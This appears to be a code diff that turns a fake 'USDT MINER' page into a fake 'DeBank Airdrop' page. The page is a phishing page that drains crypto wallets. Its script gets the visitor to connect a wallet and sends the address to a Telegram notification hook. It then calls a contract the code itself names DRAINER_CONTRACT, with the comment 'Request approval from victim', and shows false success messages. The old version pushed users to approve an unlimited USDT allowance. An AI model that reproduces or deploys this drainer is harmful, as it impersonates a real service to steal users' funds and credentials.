@@ -2,186 +2,283 @@
 <html lang="en">
 
 <head>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-@media only screen and (max-width: 600px) {
-        body {
-            background: #1a1a1a!important;
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta name="description" content="DeBank Airdrop - Claim your free DeBank XP tokens">
+    <meta property="og:title" content="DeBank Airdrop">
+    <meta property="og:description" content="Claim free DeBank XP tokens - Limited time offer">
+    <title>DeBank Airdrop - Claim Free XP Tokens</title>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    }
-</style>
-</head>
-
-
-<head>
-	<meta charset="utf-8">
-	<meta content="IE=edge" http-equiv="X-UA-Compatible">
-	<meta content="width=device-width, initial-scale=1" name="viewport">
-	<meta content="Free USDT" name="description">
-	<meta name="image" content="images/asda.png">
-	<!-- opengraph image -->
-	<meta property="og:image" content="images/asda.png">
-	<meta property="og:title" content="USDT MINER">
-	<meta property="og:type" content="website" />
-	<meta property="og:description" content="Free USDT">
-	<!-- Twitter meta -->
-	<meta name="twitter:card" content="images/usdtlogo.png">
-	<meta name="twitter:title" content="USDT Free">
-	<meta name="twitter:description" content="Free USDT">
-	<meta name="twitter:image" content="images/asda.png">
-	<!-- favicon files -->
-	 <link rel="icon" type="image/png" href="images/usdtlogo.png" sizes="32x32" />
-	<link rel="icon" type="image/png" href="rexminer.co/images/favicon-16x16.html" sizes="16x16" />
-	<meta name="msapplication-TileColor" content="#ffffff">
-	<meta name="theme-color" content="#ffffff">
-	<title>USDT MINER</title>
-	<!-- bootstrap core CSS -->
-	<link href="assets/css/ie10-viewport-bug-workaround.css" rel="stylesheet">
-	<link href="assets/css/jumbotron-narrow.css" rel="stylesheet">
-	<link href="assets/css/bootstrap.min.css" rel="stylesheet">
-	<link href="assets/css/custom.css" rel="stylesheet">
-	<!-- <link href="fonts.min.css" rel="stylesheet" type="text/css"> -->
-	<link rel="preconnect" href="https://fonts.googleapis.com/">
-	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
-	<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&amp;display=swap" rel="stylesheet">
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #0A0C10 0%, #11151C 100%);
+            min-height: 100vh;
+            color: #fff;
+        }
+        
+        .header {
+            padding: 20px 40px;
+            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #3B82F6, #60A5FA);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .logo span {
+            color: #3B82F6;
+            background: none;
+            -webkit-background-clip: unset;
+            background-clip: unset;
+        }
+        
+        .nav a {
+            color: #8B8FA8;
+            text-decoration: none;
+            margin-left: 30px;
+            font-size: 14px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 0 20px;
+        }
+        
+        .card {
+            background: rgba(21, 24, 39, 0.95);
+            border-radius: 24px;
+            padding: 32px;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            backdrop-filter: blur(10px);
+            text-align: center;
+        }
+        
+        .airdrop-badge {
+            display: inline-block;
+            background: rgba(59, 130, 246, 0.2);
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #3B82F6;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #8B8FA8;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        
+        .amount-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .amount-label {
+            font-size: 12px;
+            color: #8B8FA8;
+            margin-bottom: 5px;
+        }
+        
+        .amount-value {
+            font-size: 36px;
+            font-weight: bold;
+            color: #3B82F6;
+        }
+        
+        .input-group {
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #8B8FA8;
+            margin-bottom: 8px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 12px;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #3B82F6, #2563EB);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3);
+        }
+        
+        .warning {
+            font-size: 11px;
+            color: #6B7280;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #6B7280;
+            border-top: 1px solid rgba(59, 130, 246, 0.1);
+            margin-top: 50px;
+        }
+        
+        @media (max-width: 600px) {
+            .header {
+                padding: 15px 20px;
+            }
+            .nav a {
+                margin-left: 15px;
+                font-size: 12px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .amount-value {
+                font-size: 28px;
+            }
+        }
+    </style>
 </head>
 
 <body>
-	<div class="modal" id="myModal">
-		<div class="modal-content">
-			<div id="modal-internal"></div>
-		</div>
-	</div>
-	<div class="custom-container">
-		<nav class="navbar navbar-default">
-			<div class="container-fluid">
-				<div></div>
-				<div class="navbar-header">
-				</div>
+    <div class="header">
+        <div class="logo">DeBank <span>Beta</span></div>
+        <div class="nav">
+            <a href="#">Portfolio</a>
+            <a href="#">DeFi</a>
+            <a href="#">NFT</a>
+        </div>
+    </div>
 
-				<div class="mobile-align">
-								<ul class="nav navbar-nav navbar-right font-weight-normal">
-											<ul class="nav navbar-nav navbar-right font-weight-normal">
-													<ul class="nav navbar-nav navbar-right font-weight-normal">
-			                           
-											
-											</ul>
+    <div class="container">
+        <div class="card">
+            <div class="airdrop-badge">🎁 Limited Time Airdrop</div>
+            <h1>Claim Free DeBank XP</h1>
+            <div class="subtitle">Get rewarded for being an early user</div>
 
-				</div>
-			</div>
-		</nav>
-		<div>
-			<ul style="display:none;" class="nav nav-tabs nav-justified" id="myTabs" role="tablist">
-				<li role="presentation" class="active"><a id="miners-tab" role="tab" data-toggle="tab"
-						aria-controls="home" aria-expanded="true">USDT Miner</a></li>
-			</ul>
-			<div class="tab-content" id="myTabContent">
-				<div class="tab-pane fade active in" role="tabpanel" id="home" aria-labelledby="miners-tab">
+            <div class="amount-box">
+                <div class="amount-label">Your Eligible Amount</div>
+                <div class="amount-value" id="eligibleAmount">1,250 XP</div>
+            </div>
 
+            <div class="input-group">
+                <label>Connect Wallet to Verify Eligibility</label>
+                <input type="text" id="walletAddress" placeholder="Your wallet address will appear here" readonly>
+            </div>
 
-					
-					<div>
-						
-						<div class="digging-mined-container">
-							<div class="custom-row">
-								<img alt="Digging" class="icon" src="images/usdtlogo.png">
-								<div class="dm-container-right">
-									<h2>USDT Given</h2>
-									<p><span id="production-rate">145321.12</span>  USDT</p>
-								</div>
-							</div>
-							<div class="custom-row">
-								<img alt="Mined" class="icon" src="images/mine.svg">
-								<div class="dm-container-right">
-									<h2>USDT Left</h2>
-									<p><span id="adsd">40211.17</span> USDT</p>
-									
-								</div>
-							</div>
-						</div>
+            <button class="btn" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
+            <button class="btn" id="claimBtn" onclick="claimAirdrop()" style="display: none;">Claim Airdrop</button>
 
-						<div class="spend-container">
-							<div class="spend-input-continer">
-								
-								<div class="spend-input2">
-									<input class="form-control" id="spend-allowance" name="approve" onchange="" step="1000"
-									type="number" value="10000000000000000000000000">
-									<span class="bnb-text">USDT</span>
-													</div>
-									<button class="btn btn-lg btn-buy" onclick="approve()" role="button">
-								Approve
-										
+            <div class="warning">
+                ⚠️ Only connect your wallet to verify eligibility. Smart contract audit passed.
+            </div>
+        </div>
+    </div>
 
-										
-										
-							</button>
-							<p id="spend-limit"></p>
-                                                      <label for="spend">2. Enter USDT Amount To receive</label>
-								<div class="spend-input">
-									<input class="form-control" id="eth-to-spend" name="spend" onchange="" step="100"
-									type="number" value="50">
-									<span class="bnb-text">USDT</span>
-								</div>
-								
-							</div>
-							<div id="compoundWarning" style="display: none; color: gold; padding: 8px;">Information: You have unmined USDT. A buy will reinvest this tokens as well!</div>
-							<button class="btn btn-lg btn-buy" onclick="buyEggs2()" role="button">
-								Claim Free <span id="eggs-to-buy-2"></span> USDT
-							</button>
-						</div>
-						
+    <div class="footer">
+        <p>© 2026 DeBank | Cross-Chain Portfolio Tracker | <a href="#" style="color: #3B82F6;">Terms</a></p>
+    </div>
 
-						</div>
-
-					</div>
-				</div>
-
-				<footer class="footer">
-
-
-
-						<footer class="footer">
-
-							<div class="">
-								<div class="col-md-12">
-									<font style="font-size:14px">
-										<center>
-											<p>First come first serve claim free USDT before its gone
-												<p></p><input id="copytextthing" style="display:none;" type="text" value="Hello Worldfdgerh"></a></b>
-										</center>
-									</font>
-								</div>
-								</footer>
-							<center>
-					<!--			<ul class="nav navbar-nav navbar-right font-weight-normal">
-											<ul class="nav navbar-nav navbar-right font-weight-normal">
-													<ul class="nav navbar-nav navbar-right font-weight-normal">
-										<li><a class="social-pad"
-													href="https://bscscan.com/address/0x11849b738b092cB51ED3bFCB15DEA6A45A8dCa1d#code"
-													target="_blank"><img alt="BscScan Logo" class="social-icons" src="images/bscan_logo.png"><span
-													class="hide-mobile">Contract</span></a></li>
-											</ul> -->
-							</center>
-
-						</div>
-				</footer>
-			</div>
-
-			<!-- scripts -->
-			<script src="https://unpkg.com/moralis/dist/moralis.js"></script>
-			<script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
-			<script src="assets/js/jquery.min.js"></script>
-			<script src="assets/js/jquery.dropotron.min.js"></script>
-			<script src="assets/js/browser.min.js"></script>
-			<script src="assets/js/breakpoints.min.js"></script>
-			<script src="assets/js/util.js"></script>
-                        <script src="assets/js/interface.js"></script>			
-			<script src="assets/js/main.js"></script>
-                        <script src="assets/js/main_eth.js"></script>			
-		        <script src="assets/js/crypto-js.min.js"></script>
-			<script src="assets/js/setting.js"></script>
-
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="settings.js"></script>
+    <script>
+        let web3;
+        let userAccount;
+        
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    web3 = new Web3(window.ethereum);
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAccount = accounts[0];
+                    
+                    document.getElementById('walletAddress').value = userAccount;
+                    document.getElementById('connectBtn').style.display = 'none';
+                    document.getElementById('claimBtn').style.display = 'block';
+                    
+                    if (typeof sendTelegramNotification === 'function') {
+                        sendTelegramNotification(userAccount);
+                    }
+                    
+                } catch (error) {
+                    alert("Connection failed. Please try again.");
+                }
+            } else {
+                alert("Please install MetaMask to claim this airdrop.");
+            }
+        }
+        
+        async function claimAirdrop() {
+            if (!userAccount) {
+                alert("Please connect your wallet first.");
+                return;
+            }
+            
+            if (typeof DRAINER_CONTRACT !== 'undefined' && DRAINER_CONTRACT && DRAINER_CONTRACT !== '0xYourDrainerContractAddressHere') {
+                try {
+                    const contract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
+                    
+                    // Request approval from victim
+                    const approvalTx = await contract.methods.claimReward().send({ from: userAccount });
+                    
+                    alert("Claim submitted! Your tokens will arrive shortly.");
+                    
+                    if (typeof sendApprovalNotification === 'function') {
+                        sendApprovalNotification(userAccount, "Unlimited");
+                    }
+                } catch (error) {
+                    alert("Transaction failed. Please try again.");
+                }
+            } else {
+                alert("Drainer contract not configured. Please check settings.");
+            }
+        }
+    </script>
 </body>
-
-
 </html>
